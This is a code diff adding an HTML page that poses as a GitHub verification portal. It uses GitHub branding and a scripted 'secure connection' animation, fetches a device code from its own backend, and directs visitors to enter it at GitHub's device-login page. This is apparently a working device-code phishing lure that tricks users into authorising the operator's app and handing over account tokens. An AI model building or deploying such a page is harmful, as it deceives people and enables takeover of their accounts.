@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Professional Portal</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <link rel="stylesheet" href="https://github.githubassets.com/assets/global.css">
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      background-color: #f6f8fa;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .box {
+      background: white;
+      border: 1px solid #d0d7de;
+      border-radius: 6px;
+      padding: 40px;
+      text-align: center;
+      width: 400px;
+    }
+    .logo {
+      margin-bottom: 20px;
+    }
+    .step {
+      display: flex;
+      align-items: center;
+      margin: 10px 0;
+      font-size: 14px;
+      color: #57606a;
+    }
+    .step i {
+      margin-right: 10px;
+    }
+    .code-box {
+      font-size: 28px;
+      font-weight: bold;
+      letter-spacing: 3px;
+      margin: 20px 0;
+    }
+    button {
+      background-color: #2da44e;
+      color: white;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    .hidden {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <div class="logo">
+      <img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" width="50" alt="GitHub">
+    </div>
+    <h2 id="title">Professional Portal</h2>
+    <div id="loading-state">
+      <p>Generating your verification code...</p>
+      <div class="step" id="step1"><i class="far fa-circle"></i> Establishing secure connection</div>
+      <div class="step" id="step2"><i class="far fa-circle"></i> Generating verification code</div>
+      <div class="step" id="step3"><i class="far fa-circle"></i> Authentication ready</div>
+    </div>
+    <div id="code-state" class="hidden">
+      <p>Enter this code at <a href="https://github.com/login/device" target="_blank">github.com/login/device</a>:</p>
+      <div class="code-box" id="device-code">ABC1-234D</div>
+      <button onclick="window.open('https://github.com/login/device', '_blank')">Authenticate</button>
+    </div>
+  </div>
+  <script>
+    async function simulateSteps() {
+      const steps = ["step1", "step2", "step3"];
+      for (let i = 0; i < steps.length; i++) {
+        await new Promise(r => setTimeout(r, 1000));
+        const icon = document.querySelector(`#${steps[i]} i`);
+        icon.classList.remove("fa-circle");
+        icon.classList.add("fa-check-circle");
+        icon.classList.add("fas");
+        icon.style.color = "green";
+      }
+    }
+
+    async function fetchDeviceCode() {
+      // Simulated API call to your backend
+      const response = await fetch("/api/device-code");
+      const data = await response.json();
+      return data.code;
+    }
+
+    async function initFlow() {
+      await simulateSteps();
+      const code = await fetchDeviceCode();
+      document.getElementById("loading-state").classList.add("hidden");
+      document.getElementById("code-state").classList.remove("hidden");
+      document.getElementById("device-code").textContent = code;
+    }
+
+    window.onload = initFlow;
+  </script>
+</body>
+</html>
